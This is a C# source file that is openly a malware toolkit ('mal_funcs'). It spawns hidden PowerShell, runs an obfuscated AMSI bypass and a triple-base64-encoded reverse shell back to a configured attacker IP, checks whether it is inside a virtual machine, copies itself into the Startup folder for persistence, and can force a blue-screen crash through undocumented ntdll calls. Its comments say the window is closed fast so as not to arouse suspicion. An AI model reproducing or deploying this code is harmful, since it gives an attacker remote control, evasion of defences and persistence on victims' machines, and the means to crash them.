using System.Diagnostics;
using System.Runtime.InteropServices;
using mw.utils;
using mw.settings;
using System;


namespace mw.funcs
{
	public class mal_funcs
	{
        //this is shit. must replace with something better
		public static void revSh() {
            /* 
                Creates a new powershell process and executes an AMSI bypass then a base64 encoded command to create a reverse shell 
                    + Opens on port Settings.revsh_port and requires host to have two ports open because bad function
                    + has to open a window otherwise powershell will not work in the reverse shell
                    + window is quickly closed after the reverse shell is created so it doesn't arouse suspicion
            */
			using (Process p = new Process()) {
                p.StartInfo.FileName = base64.decode("cG93") + base64.decode("ZXJzaGVs") + base64.decode("bC5leGU=");
                p.StartInfo.Arguments = "-ep bypass -noprofile -W hidden";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.CreateNoWindow = true;
                AllocConsole();
                p.Start();
                p.StandardInput.WriteLine(".(\"{0}{1}\"-f's','Et') (\"Seu\"+\"c\")  (  [TYpE](\"{2}{0}{4}{1}{3}\" -F 'a','.thr','Thre','Ead','dinG') )  ;    .('sv')  5bwL (  [TYPe](\"{0}{1}\" -F're','F')  );${MG`X`yKs}=${n`ULl};${KJf`OkB`IkN}=\"$(('Sy'+'st'+'em').NOrMaLIzE([chaR](68+2)+[CHAr](111)+[cHar](114+111-111)+[chAR](61+48)+[CHAR]([byTE]0x44)) -replace [char]([byTe]0x5c)+[ChAR](112+22-22)+[chAR]([byTe]0x7b)+[chAr](77*8/8)+[cHaR]([BytE]0x6e)+[chAR](60+65)).$([ChAR]([BYTE]0x4d)+[cHAr]([byte]0x61)+[CHAR]([bYTe]0x6e)+[cHAr]([Byte]0x61)+[chaR]([byTE]0x67)+[cHaR]([ByTe]0x65)+[char](24+85)+[cHAr]([bYte]0x65)+[cHar]([bYte]0x6e)+[chAr]([BYte]0x74)).$(('Âutõm'+'ãtíôn').noRmAliZe([Char]([BytE]0x46)+[CHar](29+82)+[CHAr]([BYtE]0x72)+[cHaR]([BYTE]0x6d)+[ChaR](19+49)) -replace [CHAr](92+7-7)+[CHar](112*86/86)+[cHAR]([BytE]0x7b)+[CHAr](77)+[CHAR]([bYTe]0x6e)+[ChaR](125)).$(('ÁmsíU'+'tìls').NorMaLIZE([cHAR](63+7)+[chAr](111+39-39)+[cHAR](114*103/103)+[CHAR]([bYTE]0x6d)+[cHar]([BYtE]0x44)) -replace [CHar]([BYte]0x5c)+[cHAr]([byTe]0x70)+[char]([BYTe]0x7b)+[cHAR](17+60)+[CHAr]([BYte]0x6e)+[chAr]([ByTE]0x7d))\";${lGkE`snLm`mUib}=(((\"{21}{62}{53}{49}{39}{19}{56}{64}{20}{46}{11}{10}{12}{14}{30}{60}{7}{61}{3}{15}{16}{24}{54}{29}{41}{0}{58}{52}{17}{23}{36}{37}{31}{57}{25}{40}{18}{38}{63}{5}{48}{50}{47}{55}{45}{34}{35}{44}{8}{1}{51}{33}{9}{28}{59}{26}{4}{6}{43}{22}{42}{32}{2}{13}{27}\"-f'1','TE','(','E]0x6f)+[chAr]([bYte','46','E]','-4','([B','Y','7b','([cHAr](','E','70)+[c','12','H',']0x72)+','[','AR]','ar]([B','nSsL)','li','+(','+[','(65+3','CHaR](10',' [c','aR](77+','5*55/55)',')','+81-','ar','epl','R]','0x','+47)+[C','H','))',' -r','y','sL','h','8','char](64+46)+[ChA','6)','Ar]([b','5','Z',']','0x5c)+[ch','S','Ar',']','ch','L+','9','(6','.no','ace',')+[','+[cH',']','yT','SsLwSs','T','rMA')).\"rEPl`ACe\"(([cHAr]83+[cHAr]115+[cHAr]76),[StRiNg][cHAr]39));  (&(\"{0}{2}{1}\"-f'GET-Vari','le','aB')  (\"seU\"+\"c\")  -VaLueOn)::(\"{1}{0}\"-f 'eep','Sl').Invoke(1247); ( &(\"{0}{2}{1}\"-f'vAR','BLe','Ia') 5bwl -Va  ).\"A`sSEmBLy\".(\"{0}{1}\"-f 'GetT','ype').Invoke(${K`jFO`kbiKN}).\"geTf`IElD\"($([chAR]([bYtE]0x61)+[Char]([byte]0x6d)+[cHAr](115+10-10)+[Char]([BYte]0x69)+[cHAr]([bytE]0x49)+[cHAr](110*35/35)+[Char]([bYtE]0x69)+[cHAR]([byTE]0x74)+[ChAR](70*56/56)+[char](97)+[char]([ByTE]0x69)+[CHar](108+36-36)+[chaR](89+12)+[chaR](100)),(\"{1}{2}{3}{0}\" -f ',Static','No','nP','ublic')).(\"{2}{0}{1}\" -f'Valu','e','Set').Invoke(${MGx`Y`ks},${T`Rue}); ");
                p.StandardInput.WriteLine(base64.decode(base64.decode(base64.decode("U2tkT2MyRlhWblZrUTBFNVNVVTFiR1I1TVZCWmJYQnNXVE5SWjFVemJIcGtSMVowVEdzMWJHUkROVlJpTWs1eVdsaFNla3hzVWtSVlJVNXpZVmRXZFdSRFoyaz0="))) + Settings.ip +"\", " + Settings.revsh_port +  base64.decode(base64.decode(base64.decode("UzFSemEyTXpVbmxhVjBaMFNVUXdaMHBIVG5OaFYxWjFaRU0xU0ZwWVVsUmtTRXBzV1Zjd2IwdFVkR0paYm13d1dsWjBaRmhUVW1sbFdGSnNZM2xCT1VsRVFYVk1hbGt4VGxSTk1XWkRWamROU0RBM1pESm9jR0pIVlc5TFExSndTVVF3WjBwSVRqQmpiVlpvWWxNMVUxcFhSbXRMUTFKcFpWaFNiR041ZDJkTlEzZG5Ta2RLTldSSFZucE1hM2hzWW0xa01HRkRhM0JKUXpGMVdsTkJkMHRZY3pkS1IxSm9aRWRGWjFCVFFXOVViVll6VEZVNWFXRnRWbXBrUTBGMFZraHNkMXBWTldoaVYxVm5WVE5zZW1SSFZuUk1iRkpzWlVoUmRWRldUa1JUVld4R1ltMU9kbHBIYkhWYWVXdDFVakpXTUZVelVubGhWelZ1UzBOU2FXVllVbXhqZVhkM1RFTkJhMkZUYXpkS1NFNXNZbTFTYVZsWFRuSkpSREJuUzBkc2JHVkRRV3RhUjBZd1dWTkJlVkJwV1hoSlNIZG5WRE5XTUV4V1RqQmpiV3gxV25sQmNFOTVVbnBhVnpWcldXMUdhbUY2U1dkUVUwRnJZekpXZFZwSFNtaFpNbk5uUzNsQmFWVkdUV2RKYVVGeVNVTm9kMlF5VVhCTWJFSm9aRWRuWjB0NVFXbFFhVUZwVDNsU2VscFhOV3RaYm13d1dsTkJPVWxEYUdKa1IxWTBaRU0xYkdKdFRuWmFSMngxV2pFd05rOXJSbFJSTUd4S1MxTTFTRnBZVWtObFdGSnNZM2xuYTJNeVZuVmFSMHBvV1RKemVVdFVjMnRqTTFKNVdsZEdkRXhzWkhsaFdGSnNTME5TZWxwWE5XdFpibXd3V2xOM2QweERVbnBhVnpWcldXNXNNRnBUTlUxYVZ6VnVaRWRuY0U5NVVucGtTRXBzV1Zjd2RWSnRlREZqTW1kdlMxZ3dOMHBIVG5OaFYxWjFaRU0xUkdKSE9YcGFVMmR3"))));
                p.StandardInput.Close();
                FreeConsole();
                p.WaitForExit();
            }			
		}

        public static bool isVM() {
            /*
                Returns true if the current machine is a virtual machine.
                    + Creates a powershell process and runs the following command:
                        Get-WmiObject -Query 'Select * from Win32_CacheMemory'
                    + If it returns a result, it is not a VM.
            */
            using (Process p = new Process()) {
                p.StartInfo.FileName = base64.decode("cG93") + base64.decode("ZXJzaGVs") + base64.decode("bC5leGU=");
                p.StartInfo.Arguments = "-ep bypass -noprofile -W hidden /K \"Get-WmiObject -Query 'Select * from Win32_CacheMemory'\"";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                if(output.Length > 0) return true;
                return false;
            }
        }


        public static void persistance() {
            /*
                Persistance in startup folder
                    + Reads all bytes from executing file
                    + If not already present, creates a new file in startup folder
                    + Writes all bytes to file
            */
            byte[] bin = File.ReadAllBytes(System.Reflection.Assembly.GetExecutingAssembly().Location);
            string startupPath = Environment.SpecialFolder.Startup.ToString();
            
            bool found = false;
            foreach (string file in Directory.GetFiles(startupPath))
            {
                if (File.ReadAllBytes(file).SequenceEqual(bin))
                {
                    //if file is already present, exit
                    found = true;
                    break;
                }
            }
            if (!found)
            {
                File.WriteAllBytes(startupPath + "\\" + util_functions.generateFileName() + ".exe", bin);
            }
            
        }


        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public static void keylogger() {
            //to do: make work
        }


        public static void bsod() {
            /*
                Blue screen of death
                    + Not even the slightest clue of how it works 
                    + I stole this from peewpw on github
                    + https://github.com/peewpw/Invoke-BSOD
            */
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }

        /*
            Functions imported from system DLLs so they can be used in the above functions
                + ntdll.dll
                + kernel32.dll
        */
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        [DllImport("kernel32.dll")]
        public static extern bool AllocConsole();
        [DllImport("kernel32.dll")]
        public static extern bool FreeConsole();


	}
}
